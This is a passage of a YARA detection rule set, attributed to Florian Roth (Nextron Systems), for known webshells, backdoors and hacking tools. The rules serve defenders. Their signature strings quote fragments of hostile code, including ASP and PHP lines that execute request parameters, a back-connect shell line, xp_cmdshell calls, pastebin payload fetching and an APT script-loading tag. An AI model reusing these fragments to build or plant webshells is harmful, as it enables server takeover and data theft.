		id = "7de89d22-0230-508a-ac50-f61730ad9f4e"
	strings:
		$s4 = "\"Program Files\\Serv-u\\Serv"
	condition:
		all of them
}
rule FSO_s_indexer_2 {
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "135fc50f85228691b401848caef3be9e"
		id = "8ef79a60-fa8c-51ee-bd87-f5467a66099b"
	strings:
		$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"
	condition:
		all of them
}
rule HYTop_DevPack_2005 {
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
	strings:
		$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
		$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
		$s9 = "scrollbar-face-color:#E4E4F3;"
	condition:
		all of them
}
rule _root_040_zip_Folder_deploy {
	meta:
		description = "Webshells Auto-generated - file deploy.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "2c9f9c58999256c73a5ebdb10a9be269"
		id = "7e592ab2-8a53-59d5-a45d-971398586479"
	strings:
		$s5 = "halon synscan 127.0.0.1 1-65536"
		$s8 = "Obviously you replace the ip address with that of the target."

	condition:
		all of them
}
rule by063cli {
	meta:
		description = "Webshells Auto-generated - file by063cli.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "49ce26eb97fd13b6d92a5e5d169db859"
		id = "9b4a4842-e084-53e8-90fb-603ba034b7df"
	strings:
		$s2 = "#popmsghello,are you all right?"
		$s4 = "connect failed,check your network and remote ip."
	condition:
		all of them
}
rule icyfox007v1_10_rar_Folder_asp {
	meta:
		description = "Webshells Auto-generated - file asp.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "2c412400b146b7b98d6e7755f7159bb9"
		id = "52150b6a-2f60-5e6b-86d1-61bc0aeb4fa8"
	strings:
		$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
	condition:
		all of them
}

rule byshell063_ntboot_2 {
	meta:
		description = "Webshells Auto-generated - file ntboot.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"
		id = "9bcb401d-619b-54b8-be51-f0e3b6eb096c"
	strings:
		$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"
	condition:
		all of them
}
rule u_uay {
	meta:
		description = "Webshells Auto-generated - file uay.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"
		id = "6a670e19-6e53-5b13-aabf-fe74d48b9113"
	strings:
		$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
		$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"
	condition:
		1 of them
}
rule bin_wuaus {
	meta:
		description = "Webshells Auto-generated - file wuaus.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "46a365992bec7377b48a2263c49e4e7d"
		id = "50b5323b-d8d1-5350-bf93-8dde3d11fd87"
	strings:
		$s1 = "9(90989@9V9^9f9n9v9"
		$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
		$s3 = ";(=@=G=O=T=X=\\="
		$s4 = "TCP Send Error!!"
		$s5 = "1\"1;1X1^1e1m1w1~1"
		$s8 = "=$=)=/=<=Y=_=j=p=z="
	condition:
		all of them
}
rule pwreveal {
	meta:
		description = "Webshells Auto-generated - file pwreveal.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b4e8447826a45b76ca45ba151a97ad50"
		id = "3d79dd13-9012-56e2-b42a-e6b3e204c601"
	strings:
		$s0 = "*<Blank - no es"
		$s3 = "JDiamondCS "
		$s8 = "sword set> [Leith=0 bytes]"
		$s9 = "ION\\System\\Floating-"
	condition:
		all of them
}
rule shelltools_g0t_root_xwhois {
	meta:
		description = "Webshells Auto-generated - file xwhois.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "0bc98bd576c80d921a3460f8be8816b4"
		id = "8f3b3bb2-5884-584a-8220-b6edbfebc8a3"
	strings:
		$s1 = "rting! "
		$s2 = "aTypCog("
		$s5 = "Diamond"
		$s6 = "r)r=rQreryr"
	condition:
		all of them
}
rule vanquish_2 {
	meta:
		description = "Webshells Auto-generated - file vanquish.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "2dcb9055785a2ee01567f52b5a62b071"
		id = "6736cad6-cba1-5b6f-ae05-e2b980280479"
	strings:
		$s2 = "Vanquish - DLL injection failed:"
	condition:
		all of them
}
rule down_rar_Folder_down {
	meta:
		description = "Webshells Auto-generated - file down.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "db47d7a12b3584a2e340567178886e71"
		id = "4e0a0e03-4f01-5b58-807c-0934cdda77ab"
	strings:
		$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"
	condition:
		all of them
}
rule cmdShell {
	meta:
		description = "Webshells Auto-generated - file cmdShell.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "8a9fef43209b5d2d4b81dfbb45182036"
		id = "be256fc4-8dc5-58e4-9ca2-5a1df936b8dd"
	strings:
		$s1 = "if cmdPath=\"wscriptShell\" then"
	condition:
		all of them
}
rule ZXshell2_0_rar_Folder_nc {
	meta:
		description = "Webshells Auto-generated - file nc.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "2cd1bf15ae84c5f6917ddb128827ae8b"
		id = "106209fc-f957-5131-825b-8eb7835625e0"
	strings:
		$s0 = "WSOCK32.dll"
		$s1 = "?bSUNKNOWNV"
		$s7 = "p@gram Jm6h)"
		$s8 = "ser32.dllCONFP@"
	condition:
		all of them
}
rule portlessinst {
	meta:
		description = "Webshells Auto-generated - file portlessinst.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "74213856fc61475443a91cd84e2a6c2f"
		id = "c641c522-7844-5002-8ae7-4aaf60d1337d"
	strings:
		$s2 = "Fail To Open Registry"
		$s3 = "f<-WLEggDr\""
		$s6 = "oMemoryCreateP"
	condition:
		all of them
}
rule SetupBDoor {
	meta:
		description = "Webshells Auto-generated - file SetupBDoor.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "41f89e20398368e742eda4a3b45716b6"
		id = "055ff783-fa9f-5037-a3d6-88b58ec1612f"
	strings:
		$s1 = "\\BDoor\\SetupBDoor"
	condition:
		all of them
}
rule phpshell_3 {
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "e8693a2d4a2ffea4df03bb678df3dc6d"
		id = "2f0ddfef-b3b5-592b-a9fb-fae4d825d0af"
	strings:
		$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
		$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"
	condition:
		all of them
}
rule BIN_Server {
	meta:
		description = "Webshells Auto-generated - file Server.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1d5aa9cbf1429bb5b8bf600335916dcd"
		id = "1625b0ee-5f9f-57d8-8333-f175f46d6c59"
	strings:
		$s0 = "configserver"
		$s1 = "GetLogicalDrives"
		$s2 = "WinExec"
		$s4 = "fxftest"
		$s5 = "upfileok"
		$s7 = "upfileer"
	condition:
		all of them
}
rule HYTop2006_rar_Folder_2006 {
	meta:
		description = "Webshells Auto-generated - file 2006.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "c19d6f4e069188f19b08fa94d44bc283"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
	strings:
		$s6 = "strBackDoor = strBackDoor "
	condition:
		all of them
}
rule r57shell_3 {
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "87995a49f275b6b75abe2521e03ac2c0"
		id = "4129d77c-2981-587b-a83e-8767dc3a48d8"
	strings:
		$s1 = "<b>\".$_POST['cmd']"
	condition:
		all of them
}
rule HDConfig {
	meta:
		description = "Webshells Auto-generated - file HDConfig.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "7d60e552fdca57642fd30462416347bd"
		id = "6f743137-e85a-5298-b51e-c8792e507d28"
	strings:
		$s0 = "An encryption key is derived from the password hash. "
		$s3 = "A hash object has been created. "
		$s4 = "Error during CryptCreateHash!"
		$s5 = "A new key container has been created."
		$s6 = "The password has been added to the hash. "
	condition:
		all of them
}
rule FSO_s_ajan_2 {
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		id = "a66c34ed-0ae2-5e04-bfc4-c82583c5e066"
	strings:
		$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
		$s3 = "/file.zip"
	condition:
		all of them
}

rule Webshell_and_Exploit_CN_APT_HK : Webshell
{
meta:
	license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
	author = "Florian Roth (Nextron Systems)"
	description = "Webshell and Exploit Code in relation with APT against Honk Kong protesters"
	date = "10.10.2014"
	score = 50
	id = "eb37a22b-4e8a-5986-bd47-4ef5b4986f47"
strings:
	$a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
	$s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">"
	$s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">"
condition:
	$a0 or ( all of ($s*) )
}

rule JSP_Browser_APT_webshell {
	meta:
		description = "VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a"
		author = "Florian Roth (Nextron Systems)"
		date = "10.10.2014"
		score = 60
		id = "06988b5b-ec8b-5a10-b659-3e846057ea51"
	strings:
		$a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
		$a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
		$a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
		$a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii
	condition:
		all of them
}

rule JSP_jfigueiredo_APT_webshell {
	meta:
		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
		author = "Florian Roth (Nextron Systems)"
		date = "12.10.2014"
		score = 60
		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"
		id = "b5080e43-44e2-54fa-b03a-057dc75d14db"
	strings:
		$a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
		$a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
	condition:
		all of them
}

rule JSP_jfigueiredo_APT_webshell_2 {
	meta:
		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
		author = "Florian Roth (Nextron Systems)"
		date = "12.10.2014"
		score = 60
		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"
		id = "91575627-78c1-5ca1-8180-cc4004df88e8"
	strings:
		$a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
		$a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
		$s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
		$s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
	condition:
		all of ($a*) or all of ($s*)
}

rule Webshell_Insomnia {
	meta:
		description = "Insomnia Webshell - file InsomniaShell.aspx"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/"
		date = "2014/12/09"
		hash = "e0cfb2ffaa1491aeaf7d3b4ee840f72d42919d22"
		score = 80
		id = "62ed3695-9ab8-54d4-a9d2-b6270c56ccfb"
	strings:
		$s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
		$s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
		$s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
		$s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
		$s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
		$s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
		$s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
		$s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii
	condition:
		3 of them
}

rule HawkEye_PHP_Panel {
	meta:
		description = "Detects HawkEye Keyloggers PHP Panel"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/12/14"
		score = 60
		id = "1d185345-6684-538f-954a-45d57a618a7a"
	strings:
		$s0 = "$fname = $_GET['fname'];" ascii fullword
		$s1 = "$data = $_GET['data'];" ascii fullword
		$s2 = "unlink($fname);" ascii fullword
		$s3 = "echo \"Success\";" fullword ascii
	condition:
		all of ($s*) and filesize < 600
}

rule SoakSoak_Infected_Wordpress {
	meta:
		description = "Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX"
		reference = "http://goo.gl/1GzWUX"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/12/15"
		score = 60
		id = "d147af65-72de-50be-9435-bef47eb4842a"
	strings:
		$s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
		$s1 = "function FuncQueueObject()" ascii fullword
		$s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword
	condition:
		all of ($s*)
}

rule Pastebin_Webshell {
	meta:
		description = "Detects a web shell that downloads content from pastebin.com http://goo.gl/7dbyZs"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		score = 70
		date = "13.01.2015"
		reference = "http://goo.gl/7dbyZs"
		id = "256051ed-da33-52b4-8bfb-ab990648d8fb"
	strings:
		$s0 = "file_get_contents(\"http://pastebin.com" ascii
		$s1 = "xcurl('http://pastebin.com/download.php" ascii
		$s2 = "xcurl('http://pastebin.com/raw.php" ascii

		$x0 = "if($content){unlink('evex.php');" ascii
		$x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii

		$y0 = "file_put_contents($pth" ascii
		$y1 = "echo \"<login_ok>" ascii
		$y2 = "str_replace('* @package Wordpress',$temp" ascii
	condition:
		1 of ($s*) or all of ($x*) or all of ($y*)
}

rule ASPXspy2 {
	meta:
		description = "Web shell - file ASPXspy2.aspx"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "not set"
		date = "2015/01/24"
		hash = "5642387d92139bfe9ae11bfef6bfe0081dcea197"
		id = "b68e0c98-0136-58d8-a2d6-57abccb1e942"
	strings:
		$s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
		$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
		$s3 = "Process[] p=Process.GetProcesses();" fullword ascii
		$s4 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
		$s5 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
		$s6 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl" ascii
		$s7 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
		$s8 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla" ascii
		$s10 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility." ascii
		$s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
		$s12 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
		$s13 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
		$s17 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
		$s20 = "else if(Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii
	condition:
		6 of them
}


/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-01-11
	Identifier: Web Shell Repo
	Reference: https://github.com/nikicat/web-malware-collection
*/

rule Webshell_27_9_c66_c99 {
	meta:
		description = "Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php ..."
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
		hash3 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash4 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
		hash5 = "6ce99e07aa98ba6dc521c34cf16fbd89654d0ba59194878dffca857a4c34e57b"
		hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
		hash7 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash8 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
		hash9 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash10 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
		id = "4b985ae7-1ae6-5976-9e8d-0d6b5faed75b"
	strings:
		$s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
		$s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
		$s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
	condition:
		filesize < 685KB and 1 of them
}

rule Webshell_acid_AntiSecShell_3 {
	meta:
		description = "Detects Webshell Acid"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash4 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash5 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
		hash6 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash7 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash8 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash9 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
		hash10 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash11 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
		hash12 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash13 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash14 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash15 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash16 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		hash17 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
		hash18 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
		id = "68d59f1e-ef35-586b-805d-1e6e3548d092"
	strings:
		$s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
		$s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii
	condition:
		filesize < 900KB and all of them
}

rule Webshell_c99_4 {
	meta:
		description = "Detects C99 Webshell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash3 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash4 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
		hash5 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash6 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash7 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash8 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
		hash9 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash10 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
		hash11 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash12 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash13 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
		hash14 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
		id = "d5035906-df17-5149-92ae-51e6ec05996e"
	strings:
		$s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
		$s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" fullword ascii
		$s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" fullword ascii
		$s4 = "$ret = myshellexec($handler);" fullword ascii
		$s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" fullword ascii
	condition:
		filesize < 900KB and 1 of them
}

rule Webshell_r57shell_2 {
	meta:
		description = "Detects Webshell R57"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
		hash2 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
		hash3 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
		hash4 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
		hash5 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
		hash6 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
		hash7 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
		hash8 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
		hash9 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
		hash10 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
		hash11 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
		hash12 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
		hash13 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
		id = "f2298430-1eff-5ed2-abee-3b26b36d16b7"
	strings:
		$s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
		$s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii
	condition:
		filesize < 900KB and all of them
}

rule Webshell_27_9_acid_c99_locus7s {
	meta:
		description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
		hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash5 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash6 = "5ae121f868555fba112ca2b1a9729d4414e795c39d14af9e599ce1f0e4e445d3"
		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash8 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		id = "f5f33b64-b815-5e32-8d2e-5e455651ec5d"
	strings:
		$s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
		$s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
	condition:
		filesize < 1711KB and 1 of them
}

rule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57 {
	meta:
		description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
		hash2 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
		hash3 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
		hash4 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
		hash5 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
		hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
		hash7 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
